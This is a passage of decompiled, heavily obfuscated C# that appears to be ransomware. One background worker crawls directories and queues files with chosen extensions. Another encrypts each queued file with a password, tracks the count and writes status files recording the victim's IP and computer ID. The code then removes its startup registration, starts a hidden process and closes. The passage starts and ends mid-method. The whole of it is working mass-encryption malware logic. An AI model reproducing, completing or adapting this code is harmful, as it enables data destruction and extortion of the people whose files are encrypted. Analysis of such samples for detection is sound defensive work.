					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						num5 = 2;
					}
					else
					{
						int num6 = 3;
						num5 = num6;
					}
					switch (num5)
					{
					case 0:
					case 2:
						PathsQueue.Clear();
						break;
					case 3:
						break;
					}
				}
				finally
				{
					if (lockTaken)
					{
						Monitor.Exit(pathsQueue);
					}
				}
				bwPathFinder = new BackgroundWorker();
				num4 = 9;
				goto IL_0178;
			case 14:
				EncryptionCount = 0L;
				num4 = 0;
				goto IL_0178;
			case 2:
			case 13:
				enumerator = StartPaths.GetEnumerator();
				num = 3;
				goto IL_017c;
			case 4:
				bwPathFinder.RunWorkerAsync();
				goto default;
			default:
				_ = 1;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					num2 = 12;
					continue;
				}
				num4 = 2;
				goto IL_0178;
			case 7:
				text = string.Empty;
				goto case 2;
			case 8:
			case 12:
				bwEncryptor = new BackgroundWorker();
				num = 11;
				goto IL_017c;
			case 0:
				pathsQueue = PathsQueue;
				num2 = 1;
				continue;
			case 5:
				bwPathFinder.DoWork += BwPathFinder_DoWork;
				num4 = 4;
				goto IL_0178;
			case 15:
				bwEncryptor.RunWorkerCompleted += BwEncryptor_RunWorkerCompleted;
				num4 = 16;
				goto IL_0178;
			case 3:
				try
				{
					while (enumerator.MoveNext())
					{
						string current = enumerator.Current;
						_ = 1;
						int num3;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							num3 = 2;
							if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
							{
								goto IL_0296;
							}
						}
						else
						{
							num3 = 3;
							if (1 == 0)
							{
								continue;
							}
						}
						switch (num3)
						{
						case 0:
						case 2:
							break;
						default:
							continue;
						}
						goto IL_0296;
						IL_0296:
						text = text + current + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(236);
					}
				}
				finally
				{
					((IDisposable)enumerator).Dispose();
				}
				_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(LogPath, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(240) + text);
				num2 = 17;
				continue;
			case 17:
				return;
				IL_0178:
				num = num4;
				goto IL_017c;
			}
			break;
		}
		goto IL_001a;
		IL_001a:
		bwPathFinder.RunWorkerCompleted += BwPathFinder_RunWorkerCompleted;
		num = 5;
		if (false)
		{
			goto IL_0040;
		}
		goto IL_017c;
		IL_0040:
		bwEncryptor.DoWork += BwEncryptor_DoWork;
		num2 = 15;
		goto IL_0180;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Stop()
	{
		//Discarded unreachable code: IL_0005, IL_0051, IL_00d8
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 5 : 4);
		bool lockTaken = default(bool);
		Queue<string> pathsQueue = default(Queue<string>);
		while (true)
		{
			int num2;
			switch (num)
			{
			default:
				lockTaken = false;
				num2 = 6;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					break;
				}
				goto case 1;
			case 1:
				Thread.Sleep(50);
				num2 = 2;
				break;
			case 2:
				pathsQueue = PathsQueue;
				goto default;
			case 0:
			case 4:
				IsStarted = false;
				num2 = 1;
				break;
			case 6:
				try
				{
					Monitor.Enter(pathsQueue, ref lockTaken);
					_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
					switch (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091() ? 3 : 2)
					{
					case 0:
					case 2:
						PathsQueue.Clear();
						break;
					case 3:
						break;
					}
					return;
				}
				finally
				{
					if (lockTaken)
					{
						Monitor.Exit(pathsQueue);
					}
				}
			}
			num = num2;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void BwPathFinder_RunWorkerCompleted(object _0020, RunWorkerCompletedEventArgs _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(LogPath, string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(244), TotalFindPaths));
		FinishedPathFinder = true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void BwPathFinder_DoWork(object _0020, DoWorkEventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_00b9, IL_01c5, IL_030a, IL_0493
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_01fd: Incompatible stack heights: 0 vs 1
		int num = 5;
		if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			goto IL_001f;
		}
		goto IL_01ce;
		IL_001f:
		List<string>.Enumerator enumerator = StartPaths.GetEnumerator();
		int num2 = 7;
		goto IL_01d2;
		IL_01d2:
		List<string>.Enumerator enumerator3 = default(List<string>.Enumerator);
		bool flag = default(bool);
		List<string> list = default(List<string>);
		while (true)
		{
			switch (num2)
			{
			case 1:
			case 4:
				break;
			case 2:
			case 3:
				try
				{
					while (enumerator3.MoveNext())
					{
						string current3 = enumerator3.Current;
						if (!IsStarted)
						{
							continue;
						}
						try
						{
							IEnumerable<string> folderFilesPaths2 = current3.GetFolderFilesPaths();
							foreach (string item in folderFilesPaths2)
							{
								try
								{
									string directoryName3 = Path.GetDirectoryName(item);
									_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
									int num5;
									if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
									{
										num5 = 1;
									}
									else
									{
										int num6 = 3;
										if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
										{
											goto IL_00fc;
										}
										num5 = num6;
									}
									goto IL_00c6;
									IL_00fc:
									flag = !list.Contains(directoryName3);
									num5 = 4;
									goto IL_00c6;
									IL_00c6:
									while (true)
									{
										switch (num5)
										{
										default:
											goto IL_009b;
										case 4:
											if (flag)
											{
												goto IL_009b;
											}
											goto end_IL_00c6;
										case 0:
										case 1:
											break;
										case 5:
											goto end_IL_00c6;
										}
										goto IL_00fc;
										IL_009b:
										list.Add(directoryName3);
										num5 = 5;
										continue;
										end_IL_00c6:
										break;
									}
								}
								catch (Exception)
								{
								}
							}
						}
						catch (Exception ex5)
						{
							_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(ErrorLogPath, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(248) + ex5.ToString());
						}
					}
				}
				finally
				{
					((IDisposable)enumerator3).Dispose();
				}
				IgnoredPaths.AddRange(list);
				break;
			case 6:
				enumerator3 = IgnoredPaths.GetEnumerator();
				goto default;
			default:
				_ = 0;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num2 = 1;
					continue;
				}
				num = 2;
				if (0 == 0)
				{
					goto IL_01ce;
				}
				goto case 5;
			case 5:
				if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(56))
				{
					num = 0;
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto IL_01ce;
				}
				return;
			case 0:
				list = new List<string>();
				num = 6;
				if (true)
				{
					goto IL_01ce;
				}
				goto case 7;
			case 7:
				try
				{
					while (enumerator.MoveNext())
					{
						string current = enumerator.Current;
						if (!IsStarted)
						{
							break;
						}
						try
						{
							if (File.Exists(current))
							{
								try
								{
									string directoryName = Path.GetDirectoryName(current);
									if (!IgnoredPaths.Contains(directoryName) && current.CheckExtension(SearchExtensions))
									{
										lock (PathsQueue)
										{
											_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
											int num3;
											if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
											{
												num3 = 3;
												goto IL_0313;
											}
											num3 = 2;
											if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
											{
												goto IL_0313;
											}
											goto end_IL_02c6;
											IL_0313:
											switch (num3)
											{
											case 0:
											case 2:
												PathsQueue.Enqueue(current);
												break;
											case 3:
												break;
											}
											end_IL_02c6:;
										}
										TotalFindPaths++;
									}
								}
								catch (Exception ex)
								{
									_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(ErrorLogPath, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(252) + ex.ToString());
								}
							}
							try
							{
								if (!Directory.Exists(current) || IgnoredPaths.Contains(current))
								{
									continue;
								}
								IEnumerable<string> folderFilesPaths = current.GetFolderFilesPaths();
								foreach (string item2 in folderFilesPaths)
								{
									try
									{
										string directoryName2 = Path.GetDirectoryName(item2);
										if (IgnoredPaths.Contains(directoryName2))
										{
											continue;
										}
										if (!IsStarted)
										{
											break;
										}
										if (item2.CheckExtension(SearchExtensions) && !item2.EndsWith(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(256)))
										{
											lock (PathsQueue)
											{
												_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
												int num4;
												if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
												{
													num4 = 2;
													if (false)
													{
														goto IL_0480;
													}
													goto IL_049c;
												}
												num4 = 3;
												if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
												{
													goto IL_049c;
												}
												goto end_IL_0458;
												IL_049c:
												switch (num4)
												{
												case 0:
												case 2:
													break;
												default:
													goto end_IL_0458;
												case 3:
													goto end_IL_0458;
												}
												goto IL_0480;
												IL_0480:
												PathsQueue.Enqueue(item2);
												end_IL_0458:;
											}
											TotalFindPaths++;
										}
										Thread.Sleep(1);
										continue;
									}
									catch
									{
									}
								}
							}
							catch (Exception ex2)
							{
								_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(ErrorLogPath, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(260) + ex2.ToString());
							}
						}
						catch (Exception ex3)
						{
							_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(ErrorLogPath, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(264) + ex3.ToString());
						}
					}
					return;
				}
				finally
				{
					((IDisposable)enumerator).Dispose();
				}
			}
			break;
		}
		goto IL_001f;
		IL_01ce:
		num2 = num;
		goto IL_01d2;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void BwEncryptor_DoWork(object _0020, DoWorkEventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0089, IL_014d, IL_02e5
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_01a9: Incompatible stack heights: 0 vs 1
		int num = 4;
		bool isStarted = default(bool);
		string directoryName = default(string);
		bool flag = default(bool);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 1:
					case 5:
						return;
					case 4:
						if (!_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(60))
						{
							goto case 0;
						}
						_ = 0;
						num = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 6 : 5);
						break;
					default:
						if (!isStarted)
						{
							goto IL_02b2;
						}
						try
						{
							if (PathsQueue.Count != 0)
							{
								string currentPassword = CurrentPassword;
								string text = string.Empty;
								lock (PathsQueue)
								{
									_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
									int num4;
									if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
									{
										num4 = 2;
										if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
										{
											goto IL_0076;
										}
									}
									else
									{
										num4 = 3;
									}
									switch (num4)
									{
									case 0:
									case 2:
										break;
									default:
										goto end_IL_004b;
									case 3:
										goto end_IL_004b;
									}
									goto IL_0076;
									IL_0076:
									text = PathsQueue.Dequeue();
									end_IL_004b:;
								}
								if (File.Exists(text))
								{
									try
									{
										text.EncryptFileAsync(currentPassword, _0020: true);
										int num5 = 6;
										while (true)
										{
											IL_0156:
											int num6 = num5;
											while (true)
											{
												switch (num6)
												{
												case 0:
													_0095_008F_0094_008F_008B_008C_0087_0091_0093_008C_0087_0090_0088_0092_008C_0090_0088_008B_008F_008B_0086_0088_0093_0090_0088_0092_008D_0086_0087_0093_008D_0091_0095_0086_0095_0090.WriteStatusFile(directoryName, CurrentIP, ComputerId.ToString(), DateTime.Now, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(268));
													num6 = 7;
													continue;
												case 2:
													flag = !_0095_008F_0094_008F_008B_008C_0087_0091_0093_008C_0087_0090_0088_0092_008C_0090_0088_008B_008F_008B_0086_0088_0093_0090_0088_0092_008D_0086_0087_0093_008D_0091_0095_0086_0095_0090.StatusFileExist(directoryName, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(268));
													goto default;
												case 6:
													EncryptionCount++;
													_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
													if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
													{
														num6 = 5;
														continue;
													}
													num5 = 4;
													if (0 == 0)
													{
														break;
													}
													goto case 1;
												case 1:
												case 4:
													directoryName = Path.GetDirectoryName(text);
													num5 = 2;
													break;
												default:
													if (flag)
													{
														num6 = 0;
														continue;
													}
													goto end_IL_015a;
												case 7:
													goto end_IL_015a;
												}
												goto IL_0156;
												continue;
												end_IL_015a:
												break;
											}
											break;
										}
									}
									catch (Exception ex)
									{
										_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(ErrorLogPath, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(272) + ex.ToString());
									}
								}
							}
							if (FinishedPathFinder && PathsQueue.Count == 0)
							{
								goto end_IL_02f2;
							}
						}
						catch (Exception ex2)
						{
							_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(ErrorLogPath, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(276) + ex2.ToString());
						}
						Thread.Sleep(20);
						num = 0;
						break;
					case 2:
						goto end_IL_02f2;
					case 0:
						isStarted = IsStarted;
						goto default;
					case 7:
						return;
					}
					goto end_IL_02ee;
					IL_02b2:
					num3 = 2;
					continue;
					end_IL_02f2:
					break;
				}
				_0020.Result = true;
				num2 = 7;
				continue;
				end_IL_02ee:
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void BwEncryptor_RunWorkerCompleted(object _0020, RunWorkerCompletedEventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_008e, IL_01a6
		//IL_0006: Incompatible stack heights: 0 vs 1
		_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 3;
			if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
			{
				goto IL_002a;
			}
		}
		else
		{
			num = 1;
			if (1 == 0)
			{
				goto IL_01f9;
			}
		}
		goto IL_01af;
		IL_002a:
		_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(LogPath, string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(280), EncryptionCount));
		int num2 = 9;
		goto IL_01b3;
		IL_01f9:
		int num3;
		if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(64))
		{
			num3 = 2;
			goto IL_01ab;
		}
		bool finishedPathFinder = FinishedPathFinder;
		num2 = 8;
		goto IL_01b3;
		IL_01af:
		num2 = num;
		goto IL_01b3;
		IL_01b3:
		while (true)
		{
			switch (num2)
			{
			case 4:
				break;
			case 7:
				goto IL_0059;
			case 6:
				_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(LogPath, string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(284)));
				num2 = 7;
				continue;
			case 8:
				if (finishedPathFinder)
				{
					num2 = 4;
					continue;
				}
				return;
			default:
				_008B_0091_0087_008B_008B_008B_0087_0090_0094_0089_0087_0093_008C_0090_0090_0090_0088_0094_0089_0090_008C_008B_0095_008A_0087_0086_0089_0092_0091_008B_008E_008F_0094_0094_008E_0088.RegisterInStartup(_0020: false, Application.get_ExecutablePath());
				num3 = 6;
				goto IL_01ab;
			case 9:
				btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
				goto default;
			case 0:
			case 3:
				goto IL_01f9;
			case 2:
				return;
			case 10:
				return;
			}
			break;
			IL_0059:
			try
			{
				Process process = new Process();
				_ = 1;
				int num4;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					num4 = 2;
					if (1 == 0)
					{
						goto IL_007c;
					}
				}
				else
				{
					num4 = 3;
				}
				goto IL_0097;
				IL_00e6:
				process.Start();
				num4 = 6;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_0097;
				}
				goto IL_0101;
				IL_0101:
				process.StartInfo.FileName = _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(288);
				int num5 = 4;
				goto IL_009b;
				IL_0097:
				num5 = num4;
				goto IL_009b;
				IL_009b:
				while (true)
				{
					switch (num5)
					{
					case 1:
					case 3:
						break;
					default:
						num5 = 5;
						continue;
					case 0:
					case 2:
						process.StartInfo.UseShellExecute = false;
						break;
					case 4:
						goto IL_00e6;
					case 5:
						goto IL_0101;
					case 6:
						goto end_IL_005a;
					}
					break;
				}
				goto IL_007c;
				IL_007c:
				process.StartInfo.CreateNoWindow = true;
				goto IL_0101;
				end_IL_005a:;
			}
			catch
			{
			}
			((Form)this).Close();
			num3 = 10;
			goto IL_01ab;
		}
		goto IL_002a;
		IL_01ab:
		num = num3;
		goto IL_01af;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void timer1_Tick(object _0020, EventArgs _0020)
	{
	}//Discarded unreachable code: IL_0005
	//IL_0006: Incompatible stack heights: 0 vs 1


	[MethodImpl(MethodImplOptions.NoInlining)]
	private void timer2_Tick(object _0020, EventArgs _0020)
	{
	}//Discarded unreachable code: IL_0005
	//IL_0006: Incompatible stack heights: 0 vs 1


	[MethodImpl(MethodImplOptions.NoInlining)]
	private void button4_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_001f
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Incompatible stack heights: 0 vs 1
		int num = 4;
		string s = default(string);
		int result = default(int);
		while (true)
		{
			int num3;
			int num2;
			switch (num)
			{
			case 1:
			case 3:
			{
				bool flag = int.TryParse(s, out result);
				goto default;
			}
			default:
				MessageBox.Show(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(296) + result);
				num3 = 5;
				break;
			case 4:
				s = _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(292);
				_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num2 = 0;
					if (true)
					{
						goto IL_0028;
					}
					goto default;
				}
				num3 = 3;
				break;
			case 5:
				return;
			}
			num2 = num3;
			goto IL_0028;
			IL_0028:
			num = num2;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void timer3_Tick(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0087
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 3;
